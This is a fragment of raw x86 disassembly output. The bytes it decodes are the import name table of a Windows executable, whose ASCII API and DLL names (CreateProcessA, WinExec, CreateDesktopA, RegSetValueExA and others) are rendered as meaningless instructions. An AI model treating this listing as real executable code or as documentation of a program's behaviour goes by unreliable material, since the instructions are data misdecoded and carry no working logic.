  42d715:	79 46                	jns    0x42d75d
  42d717:	69 6c 65 41 00 94 01 	imul   $0x49019400,0x41(%ebp,%eiz,2),%ebp
  42d71e:	49 
  42d71f:	6e                   	outsb  %ds:(%esi),(%dx)
  42d720:	74 65                	je     0x42d787
  42d722:	72 6c                	jb     0x42d790
  42d724:	6f                   	outsl  %ds:(%esi),(%dx)
  42d725:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  42d728:	64 49                	fs dec %ecx
  42d72a:	6e                   	outsb  %ds:(%esi),(%dx)
  42d72b:	63 72 65             	arpl   %esi,0x65(%edx)
  42d72e:	6d                   	insl   (%dx),%es:(%edi)
  42d72f:	65 6e                	outsb  %gs:(%esi),(%dx)
  42d731:	74 00                	je     0x42d733
  42d733:	00 98 01 49 73 42    	add    %bl,0x42734901(%eax)
  42d739:	61                   	popa
  42d73a:	64 52                	fs push %edx
  42d73c:	65 61                	gs popa
  42d73e:	64 50                	fs push %eax
  42d740:	74 72                	je     0x42d7b4
  42d742:	00 00                	add    %al,(%eax)
  42d744:	9b                   	fwait
  42d745:	01 49 73             	add    %ecx,0x73(%ecx)
  42d748:	42                   	inc    %edx
  42d749:	61                   	popa
  42d74a:	64 57                	fs push %edi
  42d74c:	72 69                	jb     0x42d7b7
  42d74e:	74 65                	je     0x42d7b5
  42d750:	50                   	push   %eax
  42d751:	74 72                	je     0x42d7c5
  42d753:	00 a7 01 4c 6f 61    	add    %ah,0x616f4c01(%edi)
  42d759:	64 4c                	fs dec %esp
  42d75b:	69 62 72 61 72 79 41 	imul   $0x41797261,0x72(%edx),%esp
  42d762:	00 00                	add    %al,(%eax)
  42d764:	ad                   	lods   %ds:(%esi),%eax
  42d765:	01 4c 6f 63          	add    %ecx,0x63(%edi,%ebp,2)
  42d769:	61                   	popa
  42d76a:	6c                   	insb   (%dx),%es:(%edi)
  42d76b:	41                   	inc    %ecx
  42d76c:	6c                   	insb   (%dx),%es:(%edi)
  42d76d:	6c                   	insb   (%dx),%es:(%edi)
  42d76e:	6f                   	outsl  %ds:(%esi),(%dx)
  42d76f:	63 00                	arpl   %eax,(%eax)
  42d771:	00 00                	add    %al,(%eax)
  42d773:	00 b1 01 4c 6f 63    	add    %dh,0x636f4c01(%ecx)
  42d779:	61                   	popa
  42d77a:	6c                   	insb   (%dx),%es:(%edi)
  42d77b:	46                   	inc    %esi
  42d77c:	72 65                	jb     0x42d7e3
  42d77e:	65 00 d2             	gs add %dl,%dl
  42d781:	01 4f 70             	add    %ecx,0x70(%edi)
  42d784:	65 6e                	outsb  %gs:(%esi),(%dx)
  42d786:	4d                   	dec    %ebp
  42d787:	75 74                	jne    0x42d7fd
  42d789:	65 78 41             	gs js  0x42d7cd
  42d78c:	00 00                	add    %al,(%eax)
  42d78e:	00 00                	add    %al,(%eax)
  42d790:	31 00                	xor    %eax,(%eax)
  42d792:	43                   	inc    %ebx
  42d793:	72 65                	jb     0x42d7fa
  42d795:	61                   	popa
  42d796:	74 65                	je     0x42d7fd
  42d798:	46                   	inc    %esi
  42d799:	69 6c 65 41 00 00 00 	imul   $0xfa000000,0x41(%ebp,%eiz,2),%ebp
  42d7a0:	fa 
  42d7a1:	01 52 65             	add    %edx,0x65(%edx)
  42d7a4:	61                   	popa
  42d7a5:	64 46                	fs inc %esi
  42d7a7:	69 6c 65 00 00 0e 02 	imul   $0x52020e00,0x0(%ebp,%eiz,2),%ebp
  42d7ae:	52 
  42d7af:	74 6c                	je     0x42d81d
  42d7b1:	55                   	push   %ebp
  42d7b2:	6e                   	outsb  %ds:(%esi),(%dx)
  42d7b3:	77 69                	ja     0x42d81e
  42d7b5:	6e                   	outsb  %ds:(%esi),(%dx)
  42d7b6:	64 00 3a             	add    %bh,%fs:(%edx)
  42d7b9:	02 53 65             	add    0x65(%ebx),%dl
  42d7bc:	74 46                	je     0x42d804
  42d7be:	69 6c 65 50 6f 69 6e 	imul   $0x746e696f,0x50(%ebp,%eiz,2),%ebp
  42d7c5:	74 
  42d7c6:	65 72 00             	gs jb  0x42d7c9
  42d7c9:	00 00                	add    %al,(%eax)
  42d7cb:	00 3c 00             	add    %bh,(%eax,%eax,1)
  42d7ce:	43                   	inc    %ebx
  42d7cf:	72 65                	jb     0x42d836
  42d7d1:	61                   	popa
  42d7d2:	74 65                	je     0x42d839
  42d7d4:	4d                   	dec    %ebp
  42d7d5:	75 74                	jne    0x42d84b
  42d7d7:	65 78 41             	gs js  0x42d81b
  42d7da:	00 00                	add    %al,(%eax)
  42d7dc:	64 02 53 6c          	add    %fs:0x6c(%ebx),%dl
  42d7e0:	65 65 70 00          	gs gs jo 0x42d7e4
  42d7e4:	6c                   	insb   (%dx),%es:(%edi)
  42d7e5:	02 54 65 72          	add    0x72(%ebp,%eiz,2),%dl
  42d7e9:	6d                   	insl   (%dx),%es:(%edi)
  42d7ea:	69 6e 61 74 65 50 72 	imul   $0x72506574,0x61(%esi),%ebp
  42d7f1:	6f                   	outsl  %ds:(%esi),(%dx)
  42d7f2:	63 65 73             	arpl   %esp,0x73(%ebp)
  42d7f5:	73 00                	jae    0x42d7f7
  42d7f7:	00 8c 02 56 69 72 74 	add    %cl,0x74726956(%edx,%eax,1)
  42d7fe:	75 61                	jne    0x42d861
  42d800:	6c                   	insb   (%dx),%es:(%edi)
  42d801:	51                   	push   %ecx
  42d802:	75 65                	jne    0x42d869
  42d804:	72 79                	jb     0x42d87f
  42d806:	00 00                	add    %al,(%eax)
  42d808:	41                   	inc    %ecx
  42d809:	00 43 72             	add    %al,0x72(%ebx)
  42d80c:	65 61                	gs popa
  42d80e:	74 65                	je     0x42d875
  42d810:	50                   	push   %eax
  42d811:	72 6f                	jb     0x42d882
  42d813:	63 65 73             	arpl   %esp,0x73(%ebp)
  42d816:	73 41                	jae    0x42d859
  42d818:	00 00                	add    %al,(%eax)
  42d81a:	00 00                	add    %al,(%eax)
  42d81c:	93                   	xchg   %eax,%ebx
  42d81d:	02 57 61             	add    0x61(%edi),%dl
  42d820:	69 74 46 6f 72 53 69 	imul   $0x6e695372,0x6f(%esi,%eax,2),%esi
  42d827:	6e 
  42d828:	67 6c                	insb   (%dx),%es:(%di)
  42d82a:	65 4f                	gs dec %edi
  42d82c:	62 6a 65             	bound  %ebp,0x65(%edx)
  42d82f:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  42d833:	00 97 02 57 69 64    	add    %dl,0x64695702(%edi)
  42d839:	65 43                	gs inc %ebx
  42d83b:	68 61 72 54 6f       	push   $0x6f547261
  42d840:	4d                   	dec    %ebp
  42d841:	75 6c                	jne    0x42d8af
  42d843:	74 69                	je     0x42d8ae
  42d845:	42                   	inc    %edx
  42d846:	79 74                	jns    0x42d8bc
  42d848:	65 00 00             	add    %al,%gs:(%eax)
  42d84b:	00 98 02 57 69 6e    	add    %bl,0x6e695702(%eax)
  42d851:	45                   	inc    %ebp
  42d852:	78 65                	js     0x42d8b9
  42d854:	63 00                	arpl   %eax,(%eax)
  42d856:	00 00                	add    %al,(%eax)
  42d858:	a2 02 57 72 69       	mov    %al,0x69725702
  42d85d:	74 65                	je     0x42d8c4
  42d85f:	46                   	inc    %esi
  42d860:	69 6c 65 00 c9 02 6c 	imul   $0x736c02c9,0x0(%ebp,%eiz,2),%ebp
  42d867:	73 
  42d868:	74 72                	je     0x42d8dc
  42d86a:	6c                   	insb   (%dx),%es:(%edi)
  42d86b:	65 6e                	outsb  %gs:(%esi),(%dx)
  42d86d:	41                   	inc    %ecx
  42d86e:	00 00                	add    %al,(%eax)
  42d870:	ca 02 6c             	lret   $0x6c02
  42d873:	73 74                	jae    0x42d8e9
  42d875:	72 6c                	jb     0x42d8e3
  42d877:	65 6e                	outsb  %gs:(%esi),(%dx)
  42d879:	57                   	push   %edi
  42d87a:	00 00                	add    %al,(%eax)
  42d87c:	47                   	inc    %edi
  42d87d:	00 43 72             	add    %al,0x72(%ebx)
  42d880:	65 61                	gs popa
  42d882:	74 65                	je     0x42d8e9
  42d884:	54                   	push   %esp
  42d885:	68 72 65 61 64       	push   $0x64616572
  42d88a:	00 00                	add    %al,(%eax)
  42d88c:	54                   	push   %esp
  42d88d:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  42d891:	65 74 65             	gs je  0x42d8f9
  42d894:	46                   	inc    %esi
  42d895:	69 6c 65 41 00 00 00 	imul   $0x66000000,0x41(%ebp,%eiz,2),%ebp
  42d89c:	66 
  42d89d:	00 47 65             	add    %al,0x65(%edi)
  42d8a0:	74 57                	je     0x42d8f9
  42d8a2:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  42d8a9:	78 74                	js     0x42d91f
  42d8ab:	41                   	inc    %ecx
  42d8ac:	00 00                	add    %al,(%eax)
  42d8ae:	00 00                	add    %al,(%eax)
  42d8b0:	6b 00 47             	imul   $0x47,(%eax),%eax
  42d8b3:	65 74 57             	gs je  0x42d90d
  42d8b6:	69 6e 64 6f 77 52 65 	imul   $0x6552776f,0x64(%esi),%ebp
  42d8bd:	63 74 00 70          	arpl   %esi,0x70(%eax,%eax,1)
  42d8c1:	00 46 69             	add    %al,0x69(%esi)
  42d8c4:	6e                   	outsb  %ds:(%esi),(%dx)
  42d8c5:	64 57                	fs push %edi
  42d8c7:	69 6e 64 6f 77 41 00 	imul   $0x41776f,0x64(%esi),%ebp
  42d8ce:	00 00                	add    %al,(%eax)
  42d8d0:	74 00                	je     0x42d8d2
  42d8d2:	47                   	inc    %edi
  42d8d3:	65 74 57             	gs je  0x42d92d
  42d8d6:	69 6e 64 6f 77 00 0e 	imul   $0xe00776f,0x64(%esi),%ebp
  42d8dd:	00 47 65             	add    %al,0x65(%edi)
  42d8e0:	74 43                	je     0x42d925
  42d8e2:	6c                   	insb   (%dx),%es:(%edi)
  42d8e3:	61                   	popa
  42d8e4:	73 73                	jae    0x42d959
  42d8e6:	4e                   	dec    %esi
  42d8e7:	61                   	popa
  42d8e8:	6d                   	insl   (%dx),%es:(%edi)
  42d8e9:	65 41                	gs inc %ecx
  42d8eb:	00 c4                	add    %al,%ah
  42d8ed:	00 53 65             	add    %dl,0x65(%ebx)
  42d8f0:	74 46                	je     0x42d938
  42d8f2:	6f                   	outsl  %ds:(%esi),(%dx)
  42d8f3:	63 75 73             	arpl   %esi,0x73(%ebp)
  42d8f6:	00 00                	add    %al,(%eax)
  42d8f8:	c9                   	leave
  42d8f9:	00 47 65             	add    %al,0x65(%edi)
  42d8fc:	74 46                	je     0x42d944
  42d8fe:	6f                   	outsl  %ds:(%esi),(%dx)
  42d8ff:	72 65                	jb     0x42d966
  42d901:	67 72 6f             	addr16 jb 0x42d973
  42d904:	75 6e                	jne    0x42d974
  42d906:	64 57                	fs push %edi
  42d908:	69 6e 64 6f 77 00 00 	imul   $0x776f,0x64(%esi),%ebp
  42d90f:	00 16                	add    %dl,(%esi)
  42d911:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  42d915:	64 43                	fs inc %ebx
  42d917:	75 72                	jne    0x42d98b
  42d919:	73 6f                	jae    0x42d98a
  42d91b:	72 41                	jb     0x42d95e
  42d91d:	00 00                	add    %al,(%eax)
  42d91f:	00 18                	add    %bl,(%eax)
  42d921:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  42d925:	64 49                	fs dec %ecx
  42d927:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  42d92a:	41                   	inc    %ecx
  42d92b:	00 fe                	add    %bh,%dh
  42d92d:	00 53 65             	add    %dl,0x65(%ebx)
  42d930:	74 54                	je     0x42d986
  42d932:	69 6d 65 72 00 00 02 	imul   $0x2000072,0x65(%ebp),%ebp
  42d939:	00 52 65             	add    %dl,0x65(%edx)
  42d93c:	67 69 73 74 65 72 43 	imul   $0x6c437265,0x74(%bp,%di),%esi
  42d943:	6c 
  42d944:	61                   	popa
  42d945:	73 73                	jae    0x42d9ba
  42d947:	41                   	inc    %ecx
  42d948:	00 00                	add    %al,(%eax)
  42d94a:	00 00                	add    %al,(%eax)
  42d94c:	34 01                	xor    $0x1,%al
  42d94e:	4d                   	dec    %ebp
  42d94f:	65 73 73             	gs jae 0x42d9c5
  42d952:	61                   	popa
  42d953:	67 65 42             	addr16 gs inc %edx
  42d956:	6f                   	outsl  %ds:(%esi),(%dx)
  42d957:	78 41                	js     0x42d99a
  42d959:	00 00                	add    %al,(%eax)
  42d95b:	00 20                	add    %ah,(%eax)
  42d95d:	00 47 65             	add    %al,0x65(%edi)
  42d960:	74 4d                	je     0x42d9af
  42d962:	65 73 73             	gs jae 0x42d9d8
  42d965:	61                   	popa
  42d966:	67 65 41             	addr16 gs inc %ecx
  42d969:	00 00                	add    %al,(%eax)
  42d96b:	00 59 01             	add    %bl,0x1(%ecx)
  42d96e:	47                   	inc    %edi
  42d96f:	65 74 57             	gs je  0x42d9c9
  42d972:	69 6e 64 6f 77 4c 6f 	imul   $0x6f4c776f,0x64(%esi),%ebp
  42d979:	6e                   	outsb  %ds:(%esi),(%dx)
  42d97a:	67 41                	addr16 inc %ecx
  42d97c:	00 00                	add    %al,(%eax)
  42d97e:	00 00                	add    %al,(%eax)
  42d980:	5b                   	pop    %ebx
  42d981:	01 53 65             	add    %edx,0x65(%ebx)
  42d984:	74 57                	je     0x42d9dd
  42d986:	69 6e 64 6f 77 4c 6f 	imul   $0x6f4c776f,0x64(%esi),%ebp
  42d98d:	6e                   	outsb  %ds:(%esi),(%dx)
  42d98e:	67 41                	addr16 inc %ecx
  42d990:	00 00                	add    %al,(%eax)
  42d992:	00 00                	add    %al,(%eax)
  42d994:	5e                   	pop    %esi
  42d995:	01 43 72             	add    %eax,0x72(%ebx)
  42d998:	65 61                	gs popa
  42d99a:	74 65                	je     0x42da01
  42d99c:	44                   	inc    %esp
  42d99d:	65 73 6b             	gs jae 0x42da0b
  42d9a0:	74 6f                	je     0x42da11
  42d9a2:	70 41                	jo     0x42d9e5
  42d9a4:	00 00                	add    %al,(%eax)
  42d9a6:	00 00                	add    %al,(%eax)
  42d9a8:	65 01 53 65          	add    %edx,%gs:0x65(%ebx)
  42d9ac:	74 54                	je     0x42da02
  42d9ae:	68 72 65 61 64       	push   $0x64616572
  42d9b3:	44                   	inc    %esp
  42d9b4:	65 73 6b             	gs jae 0x42da22
  42d9b7:	74 6f                	je     0x42da28
  42d9b9:	70 00                	jo     0x42d9bb
  42d9bb:	00 66 01             	add    %ah,0x1(%esi)
  42d9be:	47                   	inc    %edi
  42d9bf:	65 74 54             	gs je  0x42da16
  42d9c2:	68 72 65 61 64       	push   $0x64616572
  42d9c7:	44                   	inc    %esp
  42d9c8:	65 73 6b             	gs jae 0x42da36
  42d9cb:	74 6f                	je     0x42da3c
  42d9cd:	70 00                	jo     0x42d9cf
  42d9cf:	00 24 00             	add    %ah,(%eax,%eax,1)
  42d9d2:	54                   	push   %esp
  42d9d3:	72 61                	jb     0x42da36
  42d9d5:	6e                   	outsb  %ds:(%esi),(%dx)
  42d9d6:	73 6c                	jae    0x42da44
  42d9d8:	61                   	popa
  42d9d9:	74 65                	je     0x42da40
  42d9db:	4d                   	dec    %ebp
  42d9dc:	65 73 73             	gs jae 0x42da52
  42d9df:	61                   	popa
  42d9e0:	67 65 00 00          	add    %al,%gs:(%bx,%si)
  42d9e4:	25 00 44 69 73       	and    $0x73694400,%eax
  42d9e9:	70 61                	jo     0x42da4c
  42d9eb:	74 63                	je     0x42da50
  42d9ed:	68 4d 65 73 73       	push   $0x7373654d
  42d9f2:	61                   	popa
  42d9f3:	67 65 41             	addr16 gs inc %ecx
  42d9f6:	00 00                	add    %al,(%eax)
  42d9f8:	30 00                	xor    %al,(%eax)
  42d9fa:	53                   	push   %ebx
  42d9fb:	65 6e                	outsb  %gs:(%esi),(%dx)
  42d9fd:	64 4d                	fs dec %ebp
  42d9ff:	65 73 73             	gs jae 0x42da75
  42da02:	61                   	popa
  42da03:	67 65 41             	addr16 gs inc %ecx
  42da06:	00 00                	add    %al,(%eax)
  42da08:	3d 00 50 6f 73       	cmp    $0x736f5000,%eax
  42da0d:	74 51                	je     0x42da60
  42da0f:	75 69                	jne    0x42da7a
  42da11:	74 4d                	je     0x42da60
  42da13:	65 73 73             	gs jae 0x42da89
  42da16:	61                   	popa
  42da17:	67 65 00 00          	add    %al,%gs:(%bx,%si)
  42da1b:	00 4b 00             	add    %cl,0x0(%ebx)
  42da1e:	53                   	push   %ebx
  42da1f:	68 6f 77 57 69       	push   $0x6957776f
  42da24:	6e                   	outsb  %ds:(%esi),(%dx)
  42da25:	64 6f                	outsl  %fs:(%esi),(%dx)
  42da27:	77 00                	ja     0x42da29
  42da29:	00 00                	add    %al,(%eax)
  42da2b:	00 4f 00             	add    %cl,0x0(%edi)
  42da2e:	43                   	inc    %ebx
  42da2f:	72 65                	jb     0x42da96
  42da31:	61                   	popa
  42da32:	74 65                	je     0x42da99
  42da34:	57                   	push   %edi
  42da35:	69 6e 64 6f 77 45 78 	imul   $0x7845776f,0x64(%esi),%ebp
  42da3c:	41                   	inc    %ecx
  42da3d:	00 00                	add    %al,(%eax)
  42da3f:	00 51 00             	add    %dl,0x0(%ecx)
  42da42:	44                   	inc    %esp
  42da43:	65 73 74             	gs jae 0x42daba
  42da46:	72 6f                	jb     0x42dab7
  42da48:	79 57                	jns    0x42daa1
  42da4a:	69 6e 64 6f 77 00 56 	imul   $0x5600776f,0x64(%esi),%ebp
  42da51:	00 4d 6f             	add    %cl,0x6f(%ebp)
  42da54:	76 65                	jbe    0x42dabb
  42da56:	57                   	push   %edi
  42da57:	69 6e 64 6f 77 00 00 	imul   $0x776f,0x64(%esi),%ebp
  42da5e:	00 00                	add    %al,(%eax)
  42da60:	5b                   	pop    %ebx
  42da61:	00 44 65 66          	add    %al,0x66(%ebp,%eiz,2)
  42da65:	57                   	push   %edi
  42da66:	69 6e 64 6f 77 50 72 	imul   $0x7250776f,0x64(%esi),%ebp
  42da6d:	6f                   	outsl  %ds:(%esi),(%dx)
  42da6e:	63 41 00             	arpl   %eax,0x0(%ecx)
  42da71:	00 00                	add    %al,(%eax)
  42da73:	00 5d 00             	add    %bl,0x0(%ebp)
  42da76:	43                   	inc    %ebx
  42da77:	61                   	popa
  42da78:	6c                   	insb   (%dx),%es:(%edi)
  42da79:	6c                   	insb   (%dx),%es:(%edi)
  42da7a:	57                   	push   %edi
  42da7b:	69 6e 64 6f 77 50 72 	imul   $0x7250776f,0x64(%esi),%ebp
  42da82:	6f                   	outsl  %ds:(%esi),(%dx)
  42da83:	63 41 00             	arpl   %eax,0x0(%ecx)
  42da86:	00 00                	add    %al,(%eax)
  42da88:	89 00                	mov    %eax,(%eax)
  42da8a:	47                   	inc    %edi
  42da8b:	65 74 53             	gs je  0x42dae1
  42da8e:	74 6f                	je     0x42daff
  42da90:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  42da93:	62 6a 65             	bound  %ebp,0x65(%edx)
  42da96:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  42da9a:	00 00                	add    %al,(%eax)
  42da9c:	ca 00 53             	lret   $0x5300
  42da9f:	65 74 42             	gs je  0x42dae4
  42daa2:	6b 43 6f 6c          	imul   $0x6c,0x6f(%ebx),%eax
  42daa6:	6f                   	outsl  %ds:(%esi),(%dx)
  42daa7:	72 00                	jb     0x42daa9
  42daa9:	00 00                	add    %al,(%eax)
  42daab:	00 dd                	add    %bl,%ch
  42daad:	00 53 65             	add    %dl,0x65(%ebx)
  42dab0:	74 54                	je     0x42db06
  42dab2:	65 78 74             	gs js  0x42db29
  42dab5:	43                   	inc    %ebx
  42dab6:	6f                   	outsl  %ds:(%esi),(%dx)
  42dab7:	6c                   	insb   (%dx),%es:(%edi)
  42dab8:	6f                   	outsl  %ds:(%esi),(%dx)
  42dab9:	72 00                	jb     0x42dabb
  42dabb:	00 fa                	add    %bh,%dl
  42dabd:	00 43 72             	add    %al,0x72(%ebx)
  42dac0:	65 61                	gs popa
  42dac2:	74 65                	je     0x42db29
  42dac4:	42                   	inc    %edx
  42dac5:	72 75                	jb     0x42db3c
  42dac7:	73 68                	jae    0x42db31
  42dac9:	49                   	dec    %ecx
  42daca:	6e                   	outsb  %ds:(%esi),(%dx)
  42dacb:	64 69 72 65 63 74 00 	imul   $0x7463,%fs:0x65(%edx),%esi
  42dad2:	00 
  42dad3:	00 1c 00             	add    %bl,(%eax,%eax,1)
  42dad6:	43                   	inc    %ebx
  42dad7:	72 65                	jb     0x42db3e
  42dad9:	61                   	popa
  42dada:	74 65                	je     0x42db41
  42dadc:	46                   	inc    %esi
  42dadd:	6f                   	outsl  %ds:(%esi),(%dx)
  42dade:	6e                   	outsb  %ds:(%esi),(%dx)
  42dadf:	74 41                	je     0x42db22
  42dae1:	00 00                	add    %al,(%eax)
  42dae3:	00 71 01             	add    %dh,0x1(%ecx)
  42dae6:	52                   	push   %edx
  42dae7:	65 67 43             	gs addr16 inc %ebx
  42daea:	72 65                	jb     0x42db51
  42daec:	61                   	popa
  42daed:	74 65                	je     0x42db54
  42daef:	4b                   	dec    %ebx
  42daf0:	65 79 45             	gs jns 0x42db38
  42daf3:	78 41                	js     0x42db36
  42daf5:	00 00                	add    %al,(%eax)
  42daf7:	00 74 01 52          	add    %dh,0x52(%ecx,%eax,1)
  42dafb:	65 67 43             	gs addr16 inc %ebx
  42dafe:	6c                   	insb   (%dx),%es:(%edi)
  42daff:	6f                   	outsl  %ds:(%esi),(%dx)
  42db00:	73 65                	jae    0x42db67
  42db02:	4b                   	dec    %ebx
  42db03:	65 79 00             	gs jns 0x42db06
  42db06:	00 00                	add    %al,(%eax)
  42db08:	79 01                	jns    0x42db0b
  42db0a:	52                   	push   %edx
  42db0b:	65 67 4f             	gs addr16 dec %edi
  42db0e:	70 65                	jo     0x42db75
  42db10:	6e                   	outsb  %ds:(%esi),(%dx)
  42db11:	4b                   	dec    %ebx
  42db12:	65 79 45             	gs jns 0x42db5a
  42db15:	78 41                	js     0x42db58
  42db17:	00 84 01 52 65 67 51 	add    %al,0x51676552(%ecx,%eax,1)
  42db1e:	75 65                	jne    0x42db85
  42db20:	72 79                	jb     0x42db9b
  42db22:	56                   	push   %esi
  42db23:	61                   	popa
  42db24:	6c                   	insb   (%dx),%es:(%edi)
  42db25:	75 65                	jne    0x42db8c
  42db27:	45                   	inc    %ebp
  42db28:	78 41                	js     0x42db6b
  42db2a:	00 00                	add    %al,(%eax)
  42db2c:	90                   	nop
  42db2d:	01 52 65             	add    %edx,0x65(%edx)
  42db30:	67 53                	addr16 push %ebx
  42db32:	65 74 56             	gs je  0x42db8b
  42db35:	61                   	popa
  42db36:	6c                   	insb   (%dx),%es:(%edi)
  42db37:	75 65                	jne    0x42db9e
  42db39:	45                   	inc    %ebp
  42db3a:	78 41                	js     0x42db7d
  42db3c:	00 00                	add    %al,(%eax)
  42db3e:	00 00                	add    %al,(%eax)
  42db40:	ca 01 47             	lret   $0x4701
  42db43:	65 74 53             	gs je  0x42db99
  42db46:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  42db4a:	69 74 79 49 6e 66 6f 	imul   $0x6f666e,0x49(%ecx,%edi,2),%esi
  42db51:	00 
  42db52:	00 00                	add    %al,(%eax)
  42db54:	cd 01                	int    $0x1
  42db56:	53                   	push   %ebx
  42db57:	65 74 53             	gs je  0x42dbad
  42db5a:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  42db5e:	69 74 79 49 6e 66 6f 	imul   $0x6f666e,0x49(%ecx,%edi,2),%esi
  42db65:	00 
  42db66:	00 00                	add    %al,(%eax)
  42db68:	d4 01                	aam    $0x1
  42db6a:	53                   	push   %ebx
  42db6b:	65 74 45             	gs je  0x42dbb3
  42db6e:	6e                   	outsb  %ds:(%esi),(%dx)
  42db6f:	74 72                	je     0x42dbe3
  42db71:	69 65 73 49 6e 41 63 	imul   $0x63416e49,0x73(%ebp),%esp
  42db78:	6c                   	insb   (%dx),%es:(%edi)
  42db79:	41                   	inc    %ecx
  42db7a:	00 00                	add    %al,(%eax)
  42db7c:	18 00                	sbb    %al,(%eax)
  42db7e:	5f                   	pop    %edi
  42db7f:	5f                   	pop    %edi
  42db80:	47                   	inc    %edi
  42db81:	65 74 4d             	gs je  0x42dbd1
  42db84:	61                   	popa
  42db85:	69 6e 41 72 67 73 00 	imul   $0x736772,0x41(%esi),%ebp
  42db8c:	81 01 5f 73 6c 65    	addl   $0x656c735f,(%ecx)
  42db92:	65 70 00             	gs jo  0x42db95
  42db95:	00 00                	add    %al,(%eax)
  42db97:	00 a6 01 5f 73 74    	add    %ah,0x74735f01(%esi)
  42db9d:	72 69                	jb     0x42dc08
  42db9f:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  42dba2:	00 00                	add    %al,(%eax)
  42dba4:	fe 01                	incb   (%ecx)
  42dba6:	61                   	popa
  42dba7:	74 6f                	je     0x42dc18
  42dba9:	69 00 00 0a 02 65    	imul   $0x65020a00,(%eax),%eax
  42dbaf:	78 69                	js     0x42dc1a
  42dbb1:	74 00                	je     0x42dbb3
  42dbb3:	00 54 02 6d          	add    %dl,0x6d(%edx,%eax,1)
  42dbb7:	65 6d                	gs insl (%dx),%es:(%edi)
  42dbb9:	63 70 79             	arpl   %esi,0x79(%eax)
  42dbbc:	00 00                	add    %al,(%eax)
  42dbbe:	00 00                	add    %al,(%eax)
  42dbc0:	56                   	push   %esi
  42dbc1:	02 6d 65             	add    0x65(%ebp),%ch
  42dbc4:	6d                   	insl   (%dx),%es:(%edi)
  42dbc5:	73 65                	jae    0x42dc2c
  42dbc7:	74 00                	je     0x42dbc9
  42dbc9:	00 00                	add    %al,(%eax)
  42dbcb:	00 5b 02             	add    %bl,0x2(%ebx)
  42dbce:	70 72                	jo     0x42dc42
  42dbd0:	69 6e 74 66 00 00 00 	imul   $0x66,0x74(%esi),%ebp
  42dbd7:	00 60 02             	add    %ah,0x2(%eax)
  42dbda:	72 61                	jb     0x42dc3d
  42dbdc:	69 73 65 00 61 02 72 	imul   $0x72026100,0x65(%ebx),%esi
  42dbe3:	61                   	popa
  42dbe4:	6e                   	outsb  %ds:(%esi),(%dx)
  42dbe5:	64 00 00             	add    %al,%fs:(%eax)
  42dbe8:	6a 02                	push   $0x2
  42dbea:	73 69                	jae    0x42dc55
  42dbec:	67 6e                	outsb  %ds:(%si),(%dx)
  42dbee:	61                   	popa
  42dbef:	6c                   	insb   (%dx),%es:(%edi)
  42dbf0:	00 00                	add    %al,(%eax)
  42dbf2:	00 00                	add    %al,(%eax)
  42dbf4:	6d                   	insl   (%dx),%es:(%edi)
  42dbf5:	02 73 70             	add    0x70(%ebx),%dh
  42dbf8:	72 69                	jb     0x42dc63
  42dbfa:	6e                   	outsb  %ds:(%esi),(%dx)
  42dbfb:	74 66                	je     0x42dc63
  42dbfd:	00 00                	add    %al,(%eax)
  42dbff:	00 6f 02             	add    %ch,0x2(%edi)
  42dc02:	73 72                	jae    0x42dc76
  42dc04:	61                   	popa
  42dc05:	6e                   	outsb  %ds:(%esi),(%dx)
  42dc06:	64 00 70 02          	add    %dh,%fs:0x2(%eax)
  42dc0a:	73 73                	jae    0x42dc7f
  42dc0c:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  42dc0f:	66 00 00             	data16 add %al,(%eax)
  42dc12:	00 00                	add    %al,(%eax)
  42dc14:	71 02                	jno    0x42dc18
  42dc16:	73 74                	jae    0x42dc8c
  42dc18:	72 63                	jb     0x42dc7d
  42dc1a:	61                   	popa
  42dc1b:	74 00                	je     0x42dc1d
  42dc1d:	00 00                	add    %al,(%eax)
  42dc1f:	00 72 02             	add    %dh,0x2(%edx)
  42dc22:	73 74                	jae    0x42dc98
  42dc24:	72 63                	jb     0x42dc89
  42dc26:	68 72 00 00 00       	push   $0x72
  42dc2b:	00 7b 02             	add    %bh,0x2(%ebx)
  42dc2e:	73 74                	jae    0x42dca4
  42dc30:	72 6e                	jb     0x42dca0
  42dc32:	63 6d 70             	arpl   %ebp,0x70(%ebp)
  42dc35:	00 00                	add    %al,(%eax)
  42dc37:	00 97 02 76 73 70    	add    %dl,0x70737602(%edi)
  42dc3d:	72 69                	jb     0x42dca8
  42dc3f:	6e                   	outsb  %ds:(%esi),(%dx)
  42dc40:	74 66                	je     0x42dca8
  42dc42:	00 00                	add    %al,(%eax)
  42dc44:	6f                   	outsl  %ds:(%esi),(%dx)
  42dc45:	6c                   	insb   (%dx),%es:(%edi)
  42dc46:	65 33 32             	xor    %gs:(%edx),%esi
  42dc49:	2e 44                	cs inc %esp
  42dc4b:	4c                   	dec    %esp
  42dc4c:	4c                   	dec    %esp
  42dc4d:	00 00                	add    %al,(%eax)
  42dc4f:	00 00                	add    %al,(%eax)
  42dc51:	d0 42 00             	rolb   $1,0x0(%edx)
  42dc54:	00 d0                	add    %dl,%al
  42dc56:	42                   	inc    %edx
  42dc57:	00 00                	add    %al,(%eax)
  42dc59:	d0 42 00             	rolb   $1,0x0(%edx)
  42dc5c:	00 d0                	add    %dl,%al
  42dc5e:	42                   	inc    %edx
  42dc5f:	00 4f 4c             	add    %cl,0x4c(%edi)
  42dc62:	45                   	inc    %ebp
  42dc63:	41                   	inc    %ecx
  42dc64:	55                   	push   %ebp
  42dc65:	54                   	push   %esp
  42dc66:	33 32                	xor    (%edx),%esi
  42dc68:	2e 44                	cs inc %esp
  42dc6a:	4c                   	dec    %esp
  42dc6b:	4c                   	dec    %esp
  42dc6c:	00 00                	add    %al,(%eax)
  42dc6e:	00 00                	add    %al,(%eax)
  42dc70:	14 d0                	adc    $0xd0,%al
  42dc72:	42                   	inc    %edx
  42dc73:	00 57 49             	add    %dl,0x49(%edi)
  42dc76:	4e                   	dec    %esi
  42dc77:	49                   	dec    %ecx
